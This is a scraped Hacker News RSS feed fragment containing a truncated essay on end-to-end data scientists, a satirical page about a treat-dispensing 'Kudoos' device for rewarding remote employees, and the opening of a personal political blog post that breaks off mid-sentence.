            <p>Recently, I came across a <a href="https://www.reddit.com/r/datascience/comments/i48b5q/for_those_that_work_for_a_team_that_has_both_data/" target="_blank">Reddit thread</a> on the different roles in data science and machine learning: data scientist, decision scientist, product data scientist, data engineer, machine learning engineer, machine learning tooling engineer, AI architect, etc.</p>

<p>I found this <em>worrying</em>. It’s difficult to be effective when the data science process (problem framing, data engineering, ML, deployment/maintenance) is split across different people. It leads to coordination overhead, diffusion of responsibility, and lack of a big picture view.</p>

<p>IMHO, <strong>I believe data scientists can be more effective by being end-to-end</strong>. Here, I’ll discuss the <a href="#from-start-identify-the-problem-to-finish-solve-it">benefits</a> and <a href="#but-we-need-specialist-experts-too">counter-arguments</a>, <a href="#the-best-way-to-pick-it-up-is-via-learning-by-doing">how to</a> become end-to-end, and the experiences of <a href="#end-to-end-in-stitch-fix-and-netflix">Stitch Fix and Netflix</a>.</p>

<h2 id="from-start-identify-the-problem-to-finish-solve-it">From start (identify the problem) to finish (solve it)</h2>

<p>You may have come across similar <em>labels</em> and definitions, such as:</p>
<ul>
  <li><a href="https://towardsdatascience.com/why-you-shouldnt-be-a-data-science-generalist-f69ea37cdd2c" target="_blank">Generalist</a>: Focused on roles (<a href="https://en.wikipedia.org/wiki/Product_manager" target="_blank">PM</a>, <a href="https://en.wikipedia.org/wiki/Business_analyst" target="_blank">BA</a>, <a href="https://www.oreilly.com/content/data-engineering-a-quick-and-simple-definition/" target="_blank">DE</a>, <a href="https://en.wikipedia.org/wiki/Category:Data_scientists" target="_blank">DS</a>, <a href="https://www.quora.com/What-exactly-does-a-machine-learning-engineer-do" target="_blank">MLE</a>); some negative connotation</li>
  <li><a href="https://skillcrush.com/blog/front-end-back-end-full-stack/" target="_blank">Full-stack</a>: Focused on tech (Spark, Torch, Docker); popularized by full-stack devs</li>
  <li><a href="https://www.infoworld.com/article/3429185/stop-searching-for-that-data-science-unicorn.html" target="_blank">Unicorn</a>: Focused on mythology; believed not to exist</li>
</ul>

<p>I find these definitions to be more prescriptive than I prefer. Instead, I have a simple (and pragmatic) definition: An end-to-end data scientist can <strong>identify and solve problems with data, to deliver value</strong>. To achieve the goal, they’ll wear as many (or as little) hats as required. They’ll also learn and apply whatever tech, methodology, and process that works. Throughout the process, they ask questions such as:</p>
<ul>
  <li>What is the problem? Why is it important?</li>
  <li>Can we solve it? How should we solve it?</li>
  <li>What is the estimated value? What was the actual value?</li>
</ul>

<details><summary>Data Science Processes</summary>
<div>
<p>Another way of defining end-to-end data science is via processes. These processes are usually complex and I’ve left them out of the main discussion. Nonetheless, here are a few in case you’re curious:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Cross-industry_standard_process_for_data_mining" target="_blank">CRISP-DM</a>: Cross-Industry Standard Process for Data Mining (1997).</li>
  <li><a href="https://en.wikipedia.org/wiki/Data_mining#Process" target="_blank">KDD</a>: Knowledge Discovery in Databases.</li>
  <li><a href="https://docs.microsoft.com/en-us/azure/machine-learning/team-data-science-process/overview" target="_blank">TDSP</a>: Team Data Science Process, proposed by Microsoft in 2018.</li>
  <li><a href="https://github.com/dslp/dslp" target="_blank">DSLP</a>: Data Science Lifecycle Process.</li>
</ul>

<p>Don’t worry if these processes seem heavy and overwhelming. You don’t have to adopt them wholesale—start bit by bit, keep what works and adapt the rest.</p>
</div>

</details>

<h2 id="more-context-faster-iteration-greater-satisfaction">More context, faster iteration, greater satisfaction</h2>

<p>For most data science roles, being more end-to-end improves your ability to make meaningful impact. (Nonetheless, there are <a href="https://nvidia.wd5.myworkdayjobs.com/en-US/NVIDIAExternalCareerSite/job/US-CA-Santa-Clara/Senior-Deep-Learning-Data-Scientist--RAPIDS---AI_JR1929838" target="_blank">roles</a> that focus on machine learning.)</p>

<p><strong>Working end-to-end provides increased context.</strong> While specialized roles can increase efficiency, it reduces context (for the data scientist) and leads to suboptimal solutions.</p>

<blockquote>
  <p>The trick to forgetting the big picture is to look at everything close-up. – Chuck Palahniuk</p>
</blockquote>

<p>It’s hard to design a holistic solution without full context of the upstream problem. Let’s say conversion has decreased and a PM raises a request to improve our search algorithm. However, what’s causing the decrease in the first place? There could be various causes:</p>
<ul>
  <li>Product: Is fraudulent/poor quality product reducing customer trust?</li>
  <li>Data pipelines: Has data quality been compromised or are there delays/outages?</li>
  <li>Model refresh: Is the model not refreshing regularly/correctly?</li>
</ul>

<p>More often than not, the problem—and solution—lies <em>outside</em> of machine learning. A solution to <em>improve the algorithm</em> would miss the root cause.</p>

<p>Similarly, it’s risky to develop a solution without awareness of downstream engineering and product constraints. There’s no point:</p>
<ul>
  <li>Building a near-real time recommender if infra and engineer cannot support it</li>
  <li>Building an infinite scroll recommender if it doesn’t fit in our product and app</li>
</ul>

<p>By working end-to-end, data scientists will have the full context to identify the right problems and develop usable solutions. It can also lead to innovative ideas that specialists, with their narrow context, might miss. Overall, it increases the ability to deliver value.</p>

<p><strong>Communication and coordination overhead is reduced.</strong> With multiple roles comes additional overhead. Let’s look at an example of a data engineer (DE) cleaning the data and creating features, a data scientist (DS) analysing the data and training the model, and a machine learning engineer (MLE) deploying and maintaining it.</p>

<blockquote>
  <p>What one programmer can do in one month, two programmers can do in two months. – Frederick P. Brooks</p>
</blockquote>

<p>The DE and DS need to <em>communicate</em> on what data is (and is not) available, how it should be cleaned (e.g., outliers, normalisation), and which features should be created. Similarly, the DS and MLE have to discuss how to deploy, monitor, and maintain the model, as well as how often it should be refreshed. When issues occur, we’ll need three people in the room (likely with a PM) to triage the root cause and next steps to fix it.</p>

<p>It also leads to additional coordination, where schedules need to be aligned as work is executed and passed along in a sequential approach. If the DS wants to experiment with additional data and features, we’ll need to wait for the DE to ingest the data and create the features. If a new model is ready for A/B testing, we’ll need to wait for the MLE to (convert it to production code) and deploy it.</p>

<p>While the actual development work may take days, the communication back-and-forth and coordination can take weeks, if not longer. With end-to-end data scientists, we can minimize this overhead as well as prevent technical details from being lost in translation.</p>

<p>(But, can an end-to-end DS really do all that? I think so. While the DS might not be as proficient in some tasks as a DE or MLE, they will be able to perform most tasks effectively. If they need help with scaling or hardening, they can always get help from specialist DEs and MLEs.)</p>

<details><summary>The Cost of Communication and Coordination</summary>
<div>
<p>Richard Hackman, a Harvard psychologist, showed that the number of relationships in a team is <code><span>N</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span> <span>/</span> <span>2</span></code>, where <code><span>N</span></code> is the number of people. This leads to exponential growth in links, where:</p>

<ul>
  <li>A start-up team of 7 has 21 links to maintain</li>
  <li>A group of 21 (i.e., three start-up teams) has 210 links</li>
  <li>A group of 63 has almost 2,000 links.</li>
</ul>

<p>In our simple example, we only had three roles (i.e., six links). But as a PM, BA, and additional members are included, this leads to greater than linear growth in communication and coordination costs. Thus, while each additional member increases total team productivity, the increased overhead means productivity grows at a decreasing rate. (Amazon’s <a href="https://buffer.com/resources/small-teams-why-startups-often-win-against-google-and-facebook-the-science-behind-why-smaller-teams-get-more-done/" target="_blank">two-pizza teams</a> are a possible solution to this.)</p>
</div>
</details>

<p><strong>Iteration and learning rate is increased.</strong> With greater context and lesser overhead, we can now iterate, fail (read: learn), and deliver value faster.</p>

<p>This is especially important for developing data and algorithmic products. Unlike software engineering (a far more mature craft), we can’t do all the learning and design before we start building—our blueprints, architectures, and design patterns are not as developed. Thus, rapid iteration is essential for the design-build-learn cycle.</p>

<p><strong>There’s greater ownership and accountability.</strong> Having the data science process split across multiple people can lead to diffusion of responsibility, and worse, social loafing.</p>

<p>A common anti-pattern observed is “<a href="https://wiki.c2.com/?ThrownOverTheWall" target="_blank">throw over the wall</a>”. For example, the DE creates features and throws a database table to the DS, the DS trains a model and throws <code>R</code> code over to the MLE, and the MLE translates it to <code>Java</code> to production.</p>

<p>If things get lost-in-translation or if results are unexpected, who is responsible? With a strong culture of ownership, everyone steps up to contribute in their respective roles. But without it, work can degenerate into ass-covering and finger-pointing while the issue persists and customers and the business suffers.</p>

<p>Having the end-to-end data scientist take ownership and responsibility for the entire process can mitigate this. They should be empowered to take action from start to finish, from the customer problem and input (i.e., raw data) to the output (i.e., deployed model) and measurable outcomes.</p>

<details><summary>Diffusion of Responsibilty &amp; Social Loafing</summary>
<div>

<p><a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility" target="_blank">Diffusion of responsibility</a>: We are less likely to take responsibility and act when there are others present. Individuals feel less responsibility and urgency to help if we know that there are others also watching the situation. </p>

<p>One form of this is the <a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility#Bystander_effect" target="_blank">Bystander effect</a>, where <a href="https://en.wikipedia.org/wiki/Murder_of_Kitty_Genovese" target="_blank">Kitty Genovese</a> was stabbed outside the apartment building across the street from where she lived. While there were 38 witnesses who saw or heard the attack, none called the police or helped her.</p>

<p><a href="https://en.wikipedia.org/wiki/Social_loafing" target="_blank">Social loafing</a>: We exert less effort when we work in a group vs. working alone. In the 1890s, Ringelmann made people pull on ropes both separately and in groups. He measured how hard they pulled and found that members of a group tended to exert less effort in pulling a rope than did individuals alone.</p>

</div>
</details>

<p><strong>For (some) data scientists, it can lead to increased motivation and job satisfaction</strong>, which is <a href="https://www.clearpointstrategy.com/how-employees-are-motivated-autonomy-mastery-purpose/" target="_blank">closely tied</a> to autonomy, mastery, and purpose.</p>
<ul>
  <li><strong>Autonomy:</strong> By being able to solve problems independently. Instead of waiting and depending on others, end-to-end data scientists are able to identify and define the problem, build their own data pipelines, and deploy and validate a solution.</li>
  <li><strong>Mastery:</strong> In the problem, solution, outcome from end-to-end. They can also pick up the domain and tech as required.</li>
  <li><strong>Purpose</strong>: By being deeply involved in the entire process, they have a more direct connection with the work and outcomes, leading to an increased sense of <em>purpose</em>.</li>
</ul>

<h2 id="but-we-need-specialist-experts-too">But, we need specialist experts too</h2>

<p>Being end-to-end is not for everyone (and every team) though, for reasons such as:</p>

<p><strong>Wanting to specialize</strong> in machine learning, or perhaps a specific niche in machine learning such as neural text generation (read: <a href="https://mc.ai/the-subtle-art-of-priming-gpt-3/" target="_blank">GPT-3 primer</a>). While being end-to-end is valuable, we also need such world-class experts in research and industry who push the envelope. Much of what we have in ML came from academia and pure research efforts.</p>

<blockquote>
  <p>No one achieves greatness by …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/end-to-end-data-science/?mkt_tok=eyJpIjoiWmpBNVlURTRNRE00WXpjMiIsInQiOiJockxCUXB1YmRPOGxvNm40UDhwdEk2dlI0UHhRY0NzTmdDV3ZnbFl4d3p6WGNZRU56Qmh1S2VNXC9zbmR2RUJrTjk4bW1DeVNUVHdBQW50aHdEOXhLd3VPVDRnbmRWOWdiSFFQVTVmaFZwZ3o3N0tLMk9Xdk9sYXBPc0I3Y1FhREoifQ%3D%3D">https://eugeneyan.com/writing/end-to-end-data-science/?mkt_tok=eyJpIjoiWmpBNVlURTRNRE00WXpjMiIsInQiOiJockxCUXB1YmRPOGxvNm40UDhwdEk2dlI0UHhRY0NzTmdDV3ZnbFl4d3p6WGNZRU56Qmh1S2VNXC9zbmR2RUJrTjk4bW1DeVNUVHdBQW50aHdEOXhLd3VPVDRnbmRWOWdiSFFQVTVmaFZwZ3o3N0tLMk9Xdk9sYXBPc0I3Y1FhREoifQ%3D%3D</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/end-to-end-data-science/?mkt_tok=eyJpIjoiWmpBNVlURTRNRE00WXpjMiIsInQiOiJockxCUXB1YmRPOGxvNm40UDhwdEk2dlI0UHhRY0NzTmdDV3ZnbFl4d3p6WGNZRU56Qmh1S2VNXC9zbmR2RUJrTjk4bW1DeVNUVHdBQW50aHdEOXhLd3VPVDRnbmRWOWdiSFFQVTVmaFZwZ3o3N0tLMk9Xdk9sYXBPc0I3Y1FhREoifQ%3D%3D</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272617</guid>
            <pubDate>Tue, 25 Aug 2020 15:54:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Train Your Remote Employee]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272611">thread link</a>) | @dsalzman
<br/>
August 25, 2020 | https://www.dannysalzman.com/2020/08/25/how-to-train-remote-employee | <a href="https://web.archive.org/web/*/https://www.dannysalzman.com/2020/08/25/how-to-train-remote-employee">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="a8786e28-940e-481a-88b6-5224ae91fc6e" class="page"><div><figure id="9908aef5-23a6-4991-a859-9bcc2b75d3af"><p><iframe src="https://player.vimeo.com/video/422640276" width="640" height="360" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p></figure><p id="1cd3001f-a94e-407c-8984-290fc480de35">Using&nbsp;<a href="https://www.thesprucepets.com/ways-to-reward-a-dog-1118276">p</a>ositive reinforcement to train your employee means you reward the behaviors you like and ignore the behaviors you do not like. You can use praise, life rewards (such as&nbsp;awards, a bonus, or&nbsp;recognition to reward your employees.</p><p id="263d2fcb-e82e-4f9e-86b7-4a5cb576fb54">The Kudoos is a another effective method to for remote managers to positively reinforce good work for their employees. It’s automatic, safe, and easy!</p><p id="a0bd861b-11b8-4d8e-88c7-290094860d2c">The Kudoos is an internet connected smart device that dispenses your employees favorite treat when they complete actions or goals specified by their manager. This could be completing a Jira task or crushing a presentation. Kudoos has integrations into Jira, Slack, and Zoom!</p><p id="866ee7a3-2c49-41e3-bd6a-b239c3d1ecf6">Use the Kudoos slash command to quickly reward a teammate for a great idea. It’s immediate feedback! They will love it.</p><h2 id="221c5e03-cf83-47c9-922d-746b02e4bf05">Slack Integration 😃</h2><p id="8be6ca5f-721c-4874-bc8b-9934711bc42c">Kudoos also has a custom slack integration to quickly give your team member some Kudoos.</p><h3 id="c7ce9347-9ede-4105-8395-63202283de27">Did they just squash a massive bug?</h3><p id="70d722ee-e23c-4b70-9b78-833e946dc493">Give some Kudoos.</p><h3 id="1900ba19-4c18-4e3a-8111-d74e3976f5e3">Did your employee stay up late crushing some new code?</h3><p id="8edfac47-88d0-4cd5-a836-3f54d2fe63bf">Give some Kudoos.</p><h3 id="f04de163-b370-4780-8abe-35e6adc4b821">Did your badass team grind out another killer sprint to make your deadline?</h3><p id="0580b504-aac6-467b-a3b0-f0689d7f0634">Give some Kudoos.</p><pre id="22d94418-54d8-44cd-aa1f-207964f3981a"><code>/feed [employee #] [amount] </code></pre><p id="b6332038-f25c-4710-afc3-f156f163cd37">Kudoos integrates seamlessly with JIRA to dispense treats when stories or tasks are completed. You can even make the Kudoos dispense based on the story points!</p><h2 id="a87296c6-1f5e-4073-9fd0-179222161b82">Apple Shortcuts Widget</h2><p id="81c3cd31-cfde-45d4-b5c5-27cbba294303">Create a custom iOS home screen button for every employee for instant feedback. You can even use Siri to invoke as well!</p><figure id="defb0ba5-cec1-4fc3-8d1c-66a95cc7f184"><p><iframe src="https://player.vimeo.com/video/422643406" width="640" height="1138" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p></figure><h2 id="7d18639b-8f6c-48e9-9aa7-16c2a15f7794">What People are Saying</h2><blockquote id="9ce69a02-1a78-4faa-ae67-600aa07607d5">I feel more connected with my team and manager</blockquote><h2 id="761768b5-8368-4d52-852c-96d96efd7213">Where do I get a Kudoos?</h2><p id="9990ac6e-1032-4ab0-b3ab-b579075bbc49">There is currently a long waitlist. Please send your order request to givemekudoos (at) fastmail.com</p></div></article></div>]]>
            </description>
            <link>https://www.dannysalzman.com/2020/08/25/how-to-train-remote-employee</link>
            <guid isPermaLink="false">hacker-news-small-sites-24272611</guid>
            <pubDate>Tue, 25 Aug 2020 15:54:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I entered the matrix through the red and blue fakesciencenews and became purple]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24272567">thread link</a>) | @gloriosoc
<br/>
August 25, 2020 | https://realscience.community/2020/08/25/how-i-entered-the-matrix-through-the-red-and-blue-fakesciencenews-and-came-out-purple/ | <a href="https://web.archive.org/web/*/https://realscience.community/2020/08/25/how-i-entered-the-matrix-through-the-red-and-blue-fakesciencenews-and-came-out-purple/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p id="block-afdaa339-e8b3-4447-a026-bf90c8730369">I have been a life long Democrat with almost 100% alignment with liberal party views. I may even fall a little bit left of left. Nationalized healthcare and free college tuition are both things I believe in. I was raised on NPR in the car with my mom and we had a print subscription to Newsweek magazine that I looked forward to reading at the kitchen table. It’s safe to say that my lifetime exposure to conservative media has been little to none. I had a medschool classmate that would sometimes drive me to school and listen to conservative talk shows on the way, just so he could get fired up and yell, but that hardly provided me with much insight. Mostly, I just thought, why are you doing this to yourself?</p>



<p id="block-e7955bc2-d365-41c9-ba94-0ec9636a2da6">But, there has always been a little suspicious voice in my head that has said- how can you totally believe one side of things? There must be some validity to the other side. There is something not quite adding up about this.</p>



<p id="block-bdbd8e30-2533-495a-af2b-eb5a385cf734">Then when Donald Trump got elected, I stopped listening to the news all together. This was a strange interlude for me given my lifelong passion for policy and advocacy. I was President of my Graduate School’s student government and Community Building Chair of the MIT Postdoc Association. In 2015, I co-founded a <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> advocacy non-profit organization, Academics for the Future of <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> (AFS), which was a partner of the national and Boston March for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> and hosted a 200 person <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> advocacy meeting and workshop at MIT (some pics below).</p>



<figure id="block-f76359d7-20ab-4228-963e-7bd4eb407353"><img src="https://realscience.community/wp-content/uploads/2020/08/grab-em-by-the-data-1024x566.png" alt="This image has an empty alt attribute; its file name is grab-em-by-the-data-1024x566.png"><figcaption>March for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> D.C.</figcaption></figure><figure id="block-d1e3f730-bd13-4bc4-8a61-4498e207860c"><img src="https://realscience.community/wp-content/uploads/2020/08/Planning-meeting-March-for-Science-1024x570.png" alt="This image has an empty alt attribute; its file name is Planning-meeting-March-for-Science-1024x570.png"><figcaption>National March for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> organizer’s planning meeting with all of the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> societies.</figcaption></figure><figure id="block-1302d7dd-7bd7-4227-af52-a7a584b149cf"><img src="https://realscience.community/wp-content/uploads/2020/08/Cambridge-Science-Festival-1024x566.png" alt="This image has an empty alt attribute; its file name is Cambridge-Science-Festival-1024x566.png"><figcaption>AFS at the Cambridge <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> Festival Robot Zoo.</figcaption></figure><figure id="block-73f4d549-100a-4bbb-aff4-12ca262580d1"><img src="https://realscience.community/wp-content/uploads/2020/08/advocating-for-science-symp-holt-walk-1024x540.png" alt="This image has an empty alt attribute; its file name is advocating-for-science-symp-holt-walk-1024x540.png"><figcaption>Walking with our keynote Speaker, former Congressmen, and then CEO of the American Association for the Advancement of <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> (AAAS), Rush Holt, during AFS’s “Advocating for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> Workshop and Symposium” in 2016.</figcaption></figure><figure id="block-11a4b735-aef4-420a-9351-fa0c6cf138b3"><img src="https://realscience.community/wp-content/uploads/2020/08/setting-up-for-symp-talk-1024x541.png" alt="This image has an empty alt attribute; its file name is setting-up-for-symp-talk-1024x541.png"><figcaption>Setting up to speak at AFS’s “Advocating for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> Workshop and Symposium” at MIT.</figcaption></figure><figure id="block-c2cdfc07-df18-46fd-a3f4-0cc9bbe4a046"><img src="https://realscience.community/wp-content/uploads/2020/08/workshop-participants-1024x384.png" alt="This image has an empty alt attribute; its file name is workshop-participants-1024x384.png"><figcaption>AFS and workshop participants.</figcaption></figure><figure id="block-fdf25323-618d-4890-b77b-f90ca86d5dee"><img src="https://realscience.community/wp-content/uploads/2020/08/classroom-1024x540.png" alt="This image has an empty alt attribute; its file name is classroom-1024x540.png"><figcaption>AFS’s Advocating for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> workshops at MIT.</figcaption></figure><p id="block-949aa724-7e35-4fca-89a6-915a4459cf2f">The election of Donald Trump shocked and traumatized me for so many reasons, pussy grabbing and a disregard for <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient 